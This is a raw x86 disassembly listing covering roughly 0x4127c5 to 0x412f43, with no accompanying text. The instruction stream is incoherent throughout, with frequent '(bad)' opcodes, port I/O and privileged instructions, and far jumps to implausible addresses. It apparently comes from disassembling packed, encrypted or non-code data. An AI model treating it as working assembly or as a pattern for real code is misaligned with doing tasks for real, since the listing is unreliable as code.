  4127c5:	leave  
  4127c6:	pusha  
  4127c7:	inc    ebp
  4127c8:	push   ds
  4127c9:	inc    edi
  4127ca:	js     0x41275a
  4127cc:	dec    ecx
  4127cd:	out    dx,eax
  4127ce:	inc    esp
  4127cf:	sbb    ah,BYTE PTR [edx]
  4127d1:	xchg   DWORD PTR [esi+eax*2-0x19],ebx
  4127d5:	sbb    al,0x6
  4127d7:	jg     0x4127e2
  4127d9:	cs ds mov ebx,0xf692f3d8
  4127e0:	imul   ecx,DWORD PTR [edi],0xc8deaa54
  4127e6:	pusha  
  4127e7:	mov    esp,edx
  4127e9:	jmp    0x41283a
  4127eb:	dec    esp
  4127ec:	dec    edi
  4127ed:	adc    al,0xf4
  4127ef:	addr16 push ebx
  4127f1:	jg     0x412861
  4127f3:	fistp  QWORD PTR ds:0x2670b673
  4127f9:	loopne 0x41285c
  4127fb:	sahf   
  4127fc:	add    dh,BYTE PTR [eax]
  4127fe:	in     al,dx
  4127ff:	mov    edx,ebx
  412801:	dec    eax
  412802:	imul   BYTE PTR [eax]
  412804:	mov    cl,0x73
  412806:	adc    al,0x61
  412808:	ss sub eax,0x592ee9e7
  41280e:	and    eax,0x813bff95
  412813:	test   al,0xd3
  412815:	add    BYTE PTR [edi+0xa],bh
  412818:	rol    DWORD PTR [esi],0x76
  41281b:	add    BYTE PTR [edx-0x1a],cl
  41281e:	ss ret 0x6eda
  412822:	jno    0x41286c
  412824:	leave  
  412825:	mov    ?,WORD PTR [edx]
  412827:	push   es
  412828:	stos   BYTE PTR es:[edi],al
  412829:	js     0x4127fa
  41282b:	dec    edi
  41282c:	ret    
  41282d:	inc    esp
  41282e:	sub    eax,0xbfe66cf7
  412833:	xor    DWORD PTR [eax+edx*4+0x71],eax
  412837:	sbb    al,0xa1
  412839:	xlat   BYTE PTR ds:[ebx]
  41283a:	frstor [ebp+0x1c]
  41283d:	push   0x14
  41283f:	inc    ebx
  412840:	jg     0x412883
  412842:	addr16 mov eax,ds:0x9a65
  412846:	jne    0x412879
  412848:	jmp    0x4eee:0xeac8623e
  41284f:	push   ebp
  412850:	shl    ch,cl
  412852:	call   0xaa25be57
  412857:	test   esp,eax
  412859:	fld    QWORD PTR [edx-0x30ec66f6]
  41285f:	push   esi
  412860:	aad    0x81
  412862:	in     eax,0x6c
  412864:	cdq    
  412865:	inc    ebx
  412866:	xchg   ecx,eax
  412867:	scas   eax,DWORD PTR es:[edi]
  412868:	and    BYTE PTR [esi],0xf4
  41286b:	ret    0x7154
  41286e:	aaa    
  41286f:	int    0xd8
  412871:	(bad)  
  412873:	jmp    0x412813
  412875:	test   BYTE PTR [esi+edx*1],bl
  412878:	mov    esp,0xa3c53a25
  41287d:	sbb    bl,dh
  41287f:	inc    ebx
  412880:	xchg   ecx,eax
  412881:	ds dec ebx
  412883:	inc    eax
  412884:	add    eax,0xe088ce52
  412889:	or     ebx,esp
  41288b:	mov    al,0xe5
  41288d:	push   es
  41288e:	frstor ds:[eax]
  412891:	xor    edx,ebx
  412893:	xchg   esi,eax
  412894:	or     DWORD PTR [ecx+0x3895adc4],ebp
  41289a:	loopne 0x4128f2
  41289c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41289d:	jno    0x41289d
  41289f:	imul   DWORD PTR [esi+0x27]
  4128a2:	out    0x10,eax
  4128a4:	fwait
  4128a5:	stos   DWORD PTR es:[edi],eax
  4128a6:	xchg   esp,eax
  4128a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a8:	add    al,0x76
  4128aa:	mov    ds:0x18716c1b,eax
  4128af:	arpl   WORD PTR [eax-0x75b8d509],bp
  4128b5:	inc    esi
  4128b6:	or     al,0x1e
  4128b8:	pop    eax
  4128b9:	ins    DWORD PTR es:[edi],dx
  4128ba:	jp     0x4128a6
  4128bc:	nop
  4128bd:	pop    es
  4128be:	xor    eax,0x653ccbfc
  4128c3:	sahf   
  4128c4:	inc    eax
  4128c5:	cmp    BYTE PTR [edx],0x40
  4128c8:	scas   eax,DWORD PTR es:[edi]
  4128c9:	add    ecx,0x56
  4128cc:	sahf   
  4128cd:	in     al,0xc2
  4128cf:	(bad)
  4128d3:	pusha  
  4128d4:	mov    ebx,0xa9e2284d
  4128d9:	and    BYTE PTR [ecx],0x73
  4128dc:	dec    esi
  4128dd:	into   
  4128de:	pop    esp
  4128df:	mov    dl,0x24
  4128e1:	sub    ecx,DWORD PTR [edx+esi*8]
  4128e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128e5:	and    al,0x33
  4128e7:	sbb    BYTE PTR [ecx+0x37],ch
  4128ea:	int    0xca
  4128ec:	dec    edx
  4128ed:	enter  0x31c0,0x54
  4128f1:	xor    cl,BYTE PTR [ecx]
  4128f3:	(bad)  
  4128f4:	(bad)  
  4128f5:	ss mov bh,0x33
  4128f8:	sub    ah,BYTE PTR [edx-0x39c219ce]
  4128fe:	bound  esi,QWORD PTR ds:0x2ca27483
  412904:	and    al,0x9e
  412906:	iret   
  412907:	pop    ebp
  412908:	leave  
  412909:	outs   dx,DWORD PTR ds:[esi]
  41290a:	(bad)  
  41290b:	hlt    
  41290c:	dec    eax
  41290d:	fwait
  41290e:	pop    eax
  41290f:	mov    al,BYTE PTR [edi-0x258853bc]
  412915:	daa    
  412916:	inc    ebp
  412917:	xchg   ecx,eax
  412918:	or     ch,BYTE PTR [eax+0x790e6c3e]
  41291e:	dec    esp
  41291f:	push   DWORD PTR [esi+0x615efbe1]
  412925:	push   edx
  412926:	nop
  412927:	cdq    
  412928:	mov    esi,0x799854f5
  41292d:	mov    bl,0x35
  41292f:	ja     0x41296f
  412931:	retf   
  412932:	sti    
  412933:	lds    ebp,FWORD PTR ds:0xc08d8321
  412939:	enter  0xf60e,0xfb
  41293d:	xchg   BYTE PTR [edi+0xb040c18],al
  412943:	test   eax,0xbe86e200
  412948:	push   ss
  412949:	xor    ch,BYTE PTR [esi+0x79b1b1a8]
  41294f:	in     al,0x39
  412951:	mov    dl,0x2
  412953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412955:	mov    esi,0xc32e33e1
  41295a:	jecxz  0x4129d9
  41295c:	aaa    
  41295d:	rsm    
  41295f:	and    DWORD PTR [ebp+0x59ec13b4],edi
  412965:	mov    ebp,DWORD PTR [eax]
  412967:	inc    edi
  412968:	pop    esp
  412969:	or     eax,0x7f474681
  41296e:	test   al,0x84
  412970:	mov    dh,BYTE PTR ds:0xa6c42c47
  412976:	(bad)  
  412977:	(bad)  
  412978:	mov    edi,db6
  41297b:	cmc    
  41297c:	mov    bl,0x9f
  41297e:	pushf  
  41297f:	idiv   eax
  412981:	ss push ds
  412983:	inc    ebx
  412984:	loop   0x412995
  412986:	sub    BYTE PTR [esi-0x403cdbd5],bh
  41298c:	pop    es
  41298d:	sub    BYTE PTR [ebp+0x3d178eb9],ch
  412993:	cs xchg ebp,eax
  412995:	outs   dx,BYTE PTR ds:[esi]
  412996:	xor    DWORD PTR [ebx],ecx
  412998:	ret    0x75ab
  41299b:	jb     0x4129c0
  41299d:	jnp    0x4129d7
  41299f:	out    0xa,eax
  4129a1:	mov    al,ds:0x4b531475
  4129a6:	dec    ebp
  4129a7:	push   ds
  4129a8:	lea    eax,[edx+0x41]
  4129ab:	out    dx,eax
  4129ac:	fnsave [ebx]
  4129ae:	mov    dl,0xad
  4129b0:	inc    ebp
  4129b1:	xchg   esp,eax
  4129b2:	dec    eax
  4129b3:	mov    dl,0xb6
  4129b5:	mov    eax,ds:0xe2aa80cf
  4129ba:	or     eax,0xc5459b21
  4129bf:	mov    ah,0x83
  4129c1:	ror    dh,0x1f
  4129c4:	jb     0x4129bf
  4129c6:	data16 shl BYTE PTR [esi-0x14],cl
  4129ca:	xor    eax,esi
  4129cc:	xor    eax,0xd2cdb814
  4129d1:	stos   BYTE PTR es:[edi],al
  4129d2:	xchg   edx,eax
  4129d3:	ret    
  4129d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129d5:	daa    
  4129d6:	lods   al,BYTE PTR ds:[esi]
  4129d7:	or     al,BYTE PTR [eax]
  4129d9:	in     ax,0x94
  4129dc:	lea    ebp,[ebx]
  4129de:	imul   BYTE PTR [eax+ebp*4-0x546fd043]
  4129e5:	push   edi
  4129e6:	or     ebx,DWORD PTR cs:[ebx]
  4129e9:	dec    edi
  4129ea:	inc    ebp
  4129eb:	in     eax,0x7b
  4129ed:	jbe    0x412a13
  4129ef:	outs   dx,DWORD PTR ds:[esi]
  4129f0:	lds    eax,FWORD PTR [esi]
  4129f2:	shr    BYTE PTR [esi-0x68f37b00],0xf9
  4129f9:	push   ss
  4129fa:	inc    edi
  4129fb:	leave  
  4129fc:	xor    al,al
  4129fe:	ror    DWORD PTR [eax],1
  412a00:	adc    esp,DWORD PTR [ecx+0x5f]
  412a03:	add    eax,0x2b20b075
  412a08:	ror    eax,cl
  412a0a:	gs xor al,0x93
  412a0d:	(bad)
  412a10:	mov    edx,0x757d2b74
  412a15:	loop   0x412a2b
  412a17:	xor    eax,0x32619c37
  412a1c:	or     al,0x33
  412a1e:	jns    0x412a03
  412a20:	in     eax,dx
  412a21:	sub    edi,ebp
  412a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a24:	test   dl,ch
  412a26:	jmp    0x412a22
  412a28:	cmp    cl,BYTE PTR ds:[edi+ecx*4-0x5c]
  412a2d:	packuswb mm1,QWORD PTR [esi]
  412a30:	pop    ds
  412a31:	cmp    DWORD PTR [edx-0x5e],ecx
  412a34:	ins    DWORD PTR es:[edi],dx
  412a35:	xchg   esi,eax
  412a36:	xor    BYTE PTR [eax-0x626ed093],al
  412a3c:	je     0x4129e9
  412a3e:	inc    edx
  412a3f:	or     DWORD PTR [edx+edx*4-0x75a5a099],edx
  412a46:	inc    ecx
  412a47:	mov    esi,0x4747e4e8
  412a4c:	sub    al,0x66
  412a4e:	mov    ebx,0xfe0f024a
  412a53:	imul   edi,DWORD PTR [ecx+0x775e3d98],0xdb1591cf
  412a5d:	idiv   BYTE PTR [eax+edi*8+0x8cc3a5b]
  412a64:	cld    
  412a65:	rcr    BYTE PTR [edx-0x26c978c4],0x17
  412a6c:	js     0x412ade
  412a6e:	test   al,0x74
  412a70:	mov    ecx,esp
  412a72:	test   DWORD PTR [edi],0x7e4a6927
  412a78:	and    eax,0x3c0a3d58
  412a7d:	xchg   esp,eax
  412a7e:	cli    
  412a7f:	xchg   BYTE PTR [ecx+0xc],al
  412a82:	sbb    bl,dl
  412a84:	pextrw eax,(bad),0xc5
  412a86:	add    ch,BYTE PTR [edi+edx*4-0x3b0de5a4]
  412a8d:	add    eax,0x93140bc2
  412a92:	xor    BYTE PTR ds:0x385318,bl
  412a98:	sub    al,0x4f
  412a9a:	imul   esi,DWORD PTR [edx],0xa195a50f
  412aa0:	mov    ebx,0xe77b7de5
  412aa5:	nop
  412aa6:	int    0x89
  412aa8:	lods   al,BYTE PTR ds:[esi]
  412aa9:	mov    dl,0xa2
  412aab:	lock adc BYTE PTR [ecx-0x20],ch
  412aaf:	es scas al,BYTE PTR es:[edi]
  412ab1:	or     ah,BYTE PTR ds:0xdd999563
  412ab7:	shl    BYTE PTR [ebp-0x22b23e3],cl
  412abd:	mov    ?,WORD PTR ds:0x6251e5c2
  412ac3:	call   0xbe93:0x9e8b8d52
  412aca:	shl    DWORD PTR [esi+0x5d],cl
  412acd:	jmp    0x412b46
  412acf:	mov    DWORD PTR [esi-0x62],esp
  412ad2:	push   ecx
  412ad3:	cmp    dh,BYTE PTR [eax]
  412ad5:	push   ebp
  412ad6:	lods   al,BYTE PTR ds:[esi]
  412ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ad8:	push   cs
  412ad9:	pop    ecx
  412ada:	adc    al,0xe0
  412adc:	pushf  
  412add:	rcr    DWORD PTR [edx+eiz*1],0x53
  412ae1:	aas    
  412ae2:	mov    edx,0x5cdc3a5a
  412ae7:	scas   eax,DWORD PTR es:[edi]
  412ae8:	(bad)  
  412ae9:	idiv   DWORD PTR [edi-0x28]
  412aec:	fdivr  QWORD PTR [esi]
  412aee:	out    0x7f,eax
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	das    
  412af2:	imul   esi,DWORD PTR [eiz*1+0x6b11c0ae],0x1eb626f0
  412afd:	popf   
  412afe:	mov    edx,0x92b6ebff
  412b03:	add    bl,bh
  412b05:	aaa    
  412b06:	jbe    0x412b4c
  412b08:	fxch   st(1)
  412b0a:	and    al,0x4a
  412b0c:	jle    0x412b87
  412b0e:	push   cs
  412b0f:	jo     0x412b28
  412b11:	(bad)  
  412b12:	and    al,0x72
  412b14:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  412b16:	lds    ecx,FWORD PTR [ebp-0x5]
  412b19:	sub    al,0x10
  412b1b:	add    al,0x32
  412b1d:	lahf   
  412b1e:	inc    ebx
  412b1f:	cmp    bl,BYTE PTR [esi-0x7c]
  412b22:	cvtpi2ps xmm5,mm1
  412b25:	mov    eax,0x4afe1314
  412b2a:	inc    edx
  412b2b:	loope  0x412ad2
  412b2d:	(bad)  
  412b2e:	sub    al,0x98
  412b30:	sbb    DWORD PTR [ebp-0x2d],ebp
  412b33:	enter  0x1894,0xda
  412b37:	ins    BYTE PTR es:[edi],dx
  412b38:	jns    0x412ac1
  412b3a:	dec    ecx
  412b3b:	sbb    eax,0x4493ada9
  412b40:	jl     0x412b70
  412b42:	les    edi,FWORD PTR [edi+0x14]
  412b45:	mov    bl,0x65
  412b47:	mov    al,ds:0xe0f4d5d7
  412b4c:	mov    al,0x5f
  412b4e:	or     ecx,eax
  412b50:	dec    esi
  412b51:	inc    edx
  412b52:	retf   
  412b53:	aas    
  412b54:	inc    edi
  412b55:	cmp    DWORD PTR [esi+0x2967f4e3],esi
  412b5b:	aas    
  412b5c:	ins    DWORD PTR es:[edi],dx
  412b5d:	dec    edx
  412b5e:	xchg   bl,dh
  412b60:	jmp    0x1049cf76
  412b65:	ins    DWORD PTR es:[edi],dx
  412b66:	into   
  412b67:	and    al,0xb
  412b69:	ror    esp,0x98
  412b6c:	mov    BYTE PTR [edi],al
  412b6e:	jl     0x412b1a
  412b70:	jmp    0x412ba2
  412b72:	retf   0xf984
  412b75:	mov    bh,0xe6
  412b77:	stos   DWORD PTR es:[edi],eax
  412b78:	sahf   
  412b79:	add    esi,DWORD PTR [edx+esi*8]
  412b7c:	pop    ebx
  412b7d:	aad    0x83
  412b7f:	mov    eax,ds:0xe398b7a3
  412b84:	lds    eax,FWORD PTR [esi+0x3c990157]
  412b8a:	xchg   ecx,eax
  412b8b:	adc    al,0x7f
  412b8d:	retf   0x5fb3
  412b90:	bnd lock data16 jbe 0x412bcc
  412b95:	shl    BYTE PTR [edi],0x4d
  412b98:	push   ebx
  412b99:	neg    eax
  412b9b:	fistp  WORD PTR [ebx-0x69ae7922]
  412ba1:	jmp    0xcc9c:0x510e135e
  412ba8:	pop    ebx
  412ba9:	test   al,0xde
  412bab:	cmc    
  412bac:	sub    DWORD PTR [eax-0x2a],edi
  412baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bb0:	retf   0x5b59
  412bb3:	and    DWORD PTR [edi-0x22],0xffffffc0
  412bb7:	add    al,0x1d
  412bb9:	xor    bh,bl
  412bbb:	xchg   DWORD PTR [edx+ebx*1+0x29],ebp
  412bbf:	jno    0x412b6f
  412bc1:	dec    eax
  412bc3:	and    al,0xb9
  412bc5:	dec    eax
  412bc6:	or     al,0xd3
  412bc8:	mov    esi,0x10080095
  412bcd:	jne    0x412bf7
  412bcf:	aas    
  412bd0:	lahf   
  412bd1:	out    dx,al
  412bd2:	test   DWORD PTR [esi+0x3d],0xab30de1a
  412bd9:	mov    ebp,0x849c3af2
  412bde:	stc    
  412bdf:	jmp    0xea6e:0x810e801a
  412be6:	adc    dl,al
  412be8:	imul   ecx,DWORD PTR [ecx],0xe9f13757
  412bee:	sahf   
  412bef:	(bad)  
  412bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bf1:	loope  0x412c23
  412bf3:	or     eax,0xe73113c2
  412bf8:	in     eax,0x22
  412bfa:	or     cl,BYTE PTR [ecx+0x79]
  412bfd:	dec    esp
  412bfe:	xlat   BYTE PTR ds:[ebx]
  412bff:	scas   al,BYTE PTR es:[edi]
  412c00:	mov    dl,0x36
  412c02:	shr    al,cl
  412c04:	jo     0x412c3d
  412c06:	daa    
  412c07:	aad    0xde
  412c09:	mov    edi,0x95441f1b
  412c0e:	shl    BYTE PTR [ecx+0x5ba36258],0xa3
  412c15:	fisttp QWORD PTR [ecx-0x56cb5eb9]
  412c1b:	jg     0x412c91
  412c1d:	and    edx,DWORD PTR [edi+0x44]
  412c20:	dec    esi
  412c21:	inc    esp
  412c22:	jmp    0xfedcc6d3
  412c27:	aas    
  412c28:	int    0x5a
  412c2a:	mov    dl,0x54
  412c2c:	icebp  
  412c2d:	(bad)  
  412c2f:	and    esi,0x282405a3
  412c35:	mov    DWORD PTR [edi],esp
  412c37:	jne    0x412c0c
  412c39:	sbb    BYTE PTR [ebx-0x66be0657],0xad
  412c40:	gs leave 
  412c42:	lea    edi,[edx+0x7ee78a0d]
  412c48:	cmp    edx,DWORD PTR [edx-0x4fa8478e]
  412c4e:	push   edx
  412c4f:	and    BYTE PTR [edi-0x6],dl
  412c52:	(bad)  
  412c53:	push   ds
  412c54:	add    eax,0x219ba2d
  412c59:	dec    eax
  412c5a:	adc    bl,BYTE PTR [ecx]
  412c5c:	(bad)  
  412c5d:	lock inc ebx
  412c5f:	xor    DWORD PTR [edx+0x640c22ae],esi
  412c65:	call   0x884d3541
  412c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6b:	cs and al,0xd7
  412c6e:	sub    al,0x75
  412c70:	inc    edx
  412c71:	pusha  
  412c72:	pop    ebp
  412c73:	adc    esp,ebp
  412c75:	xchg   edx,eax
  412c76:	fidivr DWORD PTR [esp+esi*1]
  412c79:	hlt    
  412c7a:	or     eax,ecx
  412c7c:	clc    
  412c7d:	rcl    esi,0xca
  412c80:	sub    DWORD PTR [ebx-0x6a],esi
  412c83:	sbb    ebp,DWORD PTR [eax]
  412c85:	out    0x95,al
  412c87:	in     al,dx
  412c88:	cli    
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	jns    0x412c6b
  412c8c:	xor    al,0x8
  412c8e:	adc    edx,esi
  412c90:	lea    esi,[esi-0x17f36e28]
  412c96:	pop    ecx
  412c97:	cmp    DWORD PTR [esi-0xc],0xffffffbb
  412c9b:	mov    ds:0x81ed47e5,eax
  412ca0:	jl     0x412c7e
  412ca2:	ins    BYTE PTR es:[edi],dx
  412ca3:	pusha  
  412ca4:	mov    bh,0x14
  412ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca7:	mov    fs,WORD PTR [ebp+0x2443a6d2]
  412cad:	shl    DWORD PTR [eax],0x7a
  412cb0:	mov    BYTE PTR [edx+0x78],bl
  412cb3:	ret    0xe32e
  412cb6:	mov    edi,0xe2da8866
  412cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cbc:	loope  0x412d19
  412cbe:	mov    al,ds:0x8164ef3d
  412cc3:	jo     0x412c8c
  412cc5:	mov    esp,DWORD PTR [esi+0x379019c9]
  412ccb:	rol    DWORD PTR [ebx-0x67],0x6c
  412ccf:	hlt    
  412cd0:	adc    esp,DWORD PTR [esi]
  412cd2:	mov    esp,0xccf8572b
  412cd7:	out    dx,eax
  412cd8:	pusha  
  412cd9:	xchg   esi,eax
  412cda:	jle    0x412cf3
  412cdc:	(bad)  
  412cdd:	es jmp 0x1d62:0xb97afcbe
  412ce5:	dec    esi
  412ce6:	pop    esi
  412ce7:	pop    ebp
  412ce8:	repnz pushf 
  412cea:	rol    dl,cl
  412cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ced:	dec    ebp
  412cee:	adc    al,0x5e
  412cf0:	add    cl,BYTE PTR [ebp+0x3ef78e68]
  412cf6:	add    ebp,DWORD PTR ds:0xbba00120
  412cfc:	and    eax,0xe89b929
  412d01:	or     BYTE PTR [edx],0x2b
  412d04:	fidiv  DWORD PTR [esi+0x5f]
  412d07:	add    bl,BYTE PTR [ebp+eax*4-0x2d246138]
  412d0e:	mov    ah,0x72
  412d10:	jne    0x412cbf
  412d12:	and    BYTE PTR [ebx+eax*8],al
  412d15:	test   DWORD PTR [edi],esi
  412d17:	xor    al,0x24
  412d19:	pop    edx
  412d1a:	(bad)  
  412d1b:	loopne 0x412d09
  412d1d:	sub    ah,BYTE PTR [eax-0x7c]
  412d20:	fstp   TBYTE PTR [edi-0x1e]
  412d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d24:	mul    DWORD PTR [esi]
  412d26:	(bad)  
  412d27:	lds    edi,FWORD PTR [eax+0x1d]
  412d2a:	cwd    
  412d2c:	adc    ebx,ecx
  412d2e:	dec    esi
  412d2f:	ret    0x5dff
  412d32:	jae    0x412d00
  412d34:	outs   dx,DWORD PTR ds:[esi]
  412d35:	js     0x412d5e
  412d37:	mov    DWORD PTR [ebp+0x210cab3f],ebx
  412d3d:	outs   dx,DWORD PTR ds:[esi]
  412d3e:	xlat   BYTE PTR ds:[ebx]
  412d3f:	std    
  412d40:	hlt    
  412d41:	imul   edi,ecx,0xfffffff6
  412d44:	stos   DWORD PTR es:[edi],eax
  412d45:	adc    bl,BYTE PTR [ebx+0x46944f9a]
  412d4b:	call   0x7fbc:0xff4d714b
  412d52:	in     eax,dx
  412d53:	out    dx,al
  412d54:	cmp    eax,DWORD PTR [edi+0x27bbb936]
  412d5a:	push   ebx
  412d5b:	fs jne 0x412d8e
  412d5e:	add    eax,0xd8f1bc60
  412d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d64:	jp     0x412d4e
  412d66:	push   cs
  412d67:	push   ebp
  412d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d69:	jmp    0x8dd7:0x53f4f940
  412d70:	in     al,0xe7
  412d72:	inc    esi
  412d73:	push   ecx
  412d74:	dec    esp
  412d75:	and    edx,eax
  412d77:	pop    edi
  412d78:	mov    dl,0x26
  412d7a:	xor    al,0xae
  412d7c:	cmp    al,0x63
  412d7e:	pop    ebx
  412d7f:	fstp   QWORD PTR [esi]
  412d81:	inc    eax
  412d82:	and    eax,0x2f7da76
  412d87:	call   0xcc9e2604
  412d8c:	push   0xdc9dd4f0
  412d91:	sbb    BYTE PTR [edx+0x4],dl
  412d94:	or     cl,BYTE PTR [eax+0x21]
  412d97:	add    cl,BYTE PTR [esi+0x8314f52]
  412d9d:	ficomp DWORD PTR [eax]
  412d9f:	out    dx,eax
  412da0:	mov    al,ds:0xbd9b800e
  412da5:	rcr    BYTE PTR [eax-0x25fdc068],cl
  412dab:	in     eax,dx
  412dac:	and    esi,DWORD PTR [eax]
  412dae:	sti    
  412daf:	fwait
  412db0:	and    dl,ah
  412db2:	popf   
  412db3:	mov    cl,BYTE PTR [edx+0x6f]
  412db6:	lods   eax,DWORD PTR ds:[esi]
  412db7:	jae    0x412e2a
  412db9:	outs   dx,BYTE PTR ds:[esi]
  412dba:	(bad)  
  412dbb:	popf   
  412dbc:	popf   
  412dbd:	ret    0xa100
  412dc0:	pusha  
  412dc1:	clc    
  412dc2:	fld    DWORD PTR [edx+0x2c]
  412dc5:	pop    ebp
  412dc6:	add    al,0xfd
  412dc8:	daa    
  412dc9:	cdq    
  412dca:	mov    DWORD PTR [ebx],edi
  412dcc:	jno    0x412ded
  412dce:	neg    BYTE PTR [edi-0x5a823bb]
  412dd4:	leave  
  412dd5:	sub    BYTE PTR [ebx],bh
  412dd7:	mov    al,0x49
  412dd9:	pop    eax
  412dda:	(bad)  
  412ddb:	jne    0x412e40
  412ddd:	lods   al,BYTE PTR ds:[esi]
  412dde:	mov    ah,0x84
  412de0:	jmp    0x5453e996
  412de5:	out    0xc7,eax
  412de7:	(bad)  
  412de8:	sub    ch,ch
  412dea:	dec    ebp
  412deb:	(bad)  
  412dec:	sub    DWORD PTR [eax+0x21],eax
  412def:	mov    bh,BYTE PTR [edi-0x294aed]
  412df5:	jb     0x412dc4
  412df7:	mov    WORD PTR [ecx+ebp*4],fs
  412dfa:	outs   dx,DWORD PTR ds:[esi]
  412dfb:	mov    ecx,0x32c6d193
  412e00:	mov    al,0xaf
  412e02:	outs   dx,DWORD PTR ds:[esi]
  412e03:	movntq (bad),mm1
  412e04:	out    0xc9,eax
  412e06:	adc    dl,BYTE PTR [esi-0x2a]
  412e09:	and    esp,DWORD PTR [esp+esi*8]
  412e0c:	lods   al,BYTE PTR ds:[esi]
  412e0d:	aas    
  412e0e:	pushf  
  412e0f:	ror    DWORD PTR [eax],0xc6
  412e12:	mov    ch,0x8b
  412e14:	sbb    al,0x9a
  412e16:	mov    ?,WORD PTR [eax]
  412e18:	xchg   ecx,esi
  412e1a:	into   
  412e1b:	imul   edi,DWORD PTR [esi+0x43],0x6
  412e1f:	ins    DWORD PTR es:[edi],dx
  412e20:	adc    ebp,DWORD PTR [esi]
  412e22:	mov    esi,ebx
  412e24:	outs   dx,DWORD PTR ds:[esi]
  412e25:	jmp    0x7af19fc8
  412e2a:	or     cl,bl
  412e2c:	mov    eax,ds:0x4d279346
  412e31:	retf   0xf097
  412e34:	push   0x62
  412e36:	dec    edx
  412e37:	lahf   
  412e38:	sub    DWORD PTR [ebp-0x178bf16d],esp
  412e3e:	popf   
  412e3f:	jmp    0x572a0300
  412e44:	daa    
  412e45:	dec    ebx
  412e46:	ins    BYTE PTR es:[edi],dx
  412e47:	addr16 into 
  412e49:	retf   0x3033
  412e4c:	mov    dl,0x1d
  412e4e:	ja     0x412e32
  412e50:	mov    edi,0x5ae6f94
  412e55:	clc    
  412e56:	pop    esi
  412e57:	pop    ss
  412e58:	cmp    ebp,ebx
  412e5a:	hlt    
  412e5b:	and    dl,dl
  412e5d:	imul   edx,ebp,0xffffffa3
  412e60:	inc    edx
  412e61:	pop    esp
  412e62:	jae    0x412dea
  412e64:	(bad)  
  412e65:	rol    bl,1
  412e67:	jg     0x412e13
  412e69:	test   BYTE PTR [ebx],al
  412e6b:	xchg   ecx,eax
  412e6c:	add    ecx,ebp
  412e6e:	out    0x3e,al
  412e70:	xor    eax,0xbe70756d
  412e75:	sbb    eax,0xc22f163b
  412e7a:	push   eax
  412e7b:	mov    ebp,0x2b4c1d5a
  412e80:	jns    0x412ebf
  412e82:	fadd   DWORD PTR [ebp+0x80c5344]
  412e88:	icebp  
  412e89:	outs   dx,DWORD PTR ds:[esi]
  412e8a:	pop    ss
  412e8b:	or     esi,DWORD PTR ds:[ebp+0x2b]
  412e8f:	mov    esi,0xd5f4d6ea
  412e94:	out    dx,al
  412e95:	js     0x412e34
  412e97:	xchg   esp,eax
  412e98:	jnp    0x412ed6
  412e9a:	push   esi
  412e9b:	scas   eax,DWORD PTR es:[edi]
  412e9c:	into   
  412e9d:	and    eax,0xb8e7d4a7
  412ea2:	jne    0x412eb3
  412ea4:	sub    DWORD PTR [edi+eiz*8],esp
  412ea7:	stc    
  412ea8:	dec    esi
  412ea9:	in     al,0x67
  412eab:	(bad)  
  412eac:	sbb    DWORD PTR [esi],ecx
  412eae:	xor    BYTE PTR [esi],dh
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	call   0xae09db72
  412eb6:	sbb    DWORD PTR [ecx-0x64a1df9d],ebp
  412ebc:	mov    bh,0x7c
  412ebe:	rol    DWORD PTR [eax+0x1a],0xe2
  412ec2:	sub    bh,BYTE PTR [edi+0x17]
  412ec5:	stos   BYTE PTR es:[edi],al
  412ec6:	lock xchg edi,eax
  412ec8:	mov    ds:0xc648d654,al
  412ecd:	shr    DWORD PTR [ebx+edi*8],cl
  412ed0:	inc    edx
  412ed1:	cmp    ebx,ecx
  412ed3:	stc    
  412ed4:	cmp    BYTE PTR [edi-0x19],dl
  412ed7:	push   es
  412ed8:	sbb    BYTE PTR [ecx],al
  412eda:	retf   
  412edb:	int3   
  412edc:	inc    DWORD PTR [ebx-0x3e]
  412edf:	jmp    0x4fbc5b31
  412ee4:	rcl    DWORD PTR ds:0xe2f9dad7,1
  412eea:	adc    ecx,DWORD PTR [eax+ebx*8-0x26fb7cf1]
  412ef1:	add    DWORD PTR [esi+0x75],edx
  412ef4:	dec    edi
  412ef5:	retf   
  412ef6:	(bad)  
  412ef7:	jmp    0x96ac9337
  412efc:	rol    DWORD PTR [ecx+0x571f4d7e],0x10
  412f03:	sbb    BYTE PTR [edi+0x503453b5],cl
  412f09:	dec    eax
  412f0a:	mov    ds:0xeea67b21,eax
  412f0f:	sub    DWORD PTR [esi],0x6263c9ee
  412f15:	loop   0x412ef7
  412f17:	imul   edi,ebp,0xfffffff8
  412f1a:	in     al,dx
  412f1b:	add    al,0x74
  412f1d:	lahf   
  412f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1f:	jge    0x412f99
  412f21:	push   ebx
  412f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f23:	or     eax,0x45d55609
  412f28:	or     BYTE PTR [edx+0x67b3abc9],0x80
  412f2f:	dec    eax
  412f30:	or     DWORD PTR [ebx+edi*1+0x615e6719],esp
  412f37:	outs   dx,DWORD PTR ds:[esi]
  412f38:	jb     0x412f02
  412f3a:	inc    ebx
  412f3b:	test   BYTE PTR [eax+0x36d0809a],0x20
  412f42:	xchg   esp,eax
  412f43:	adc    BYTE PTR [esi],0x53
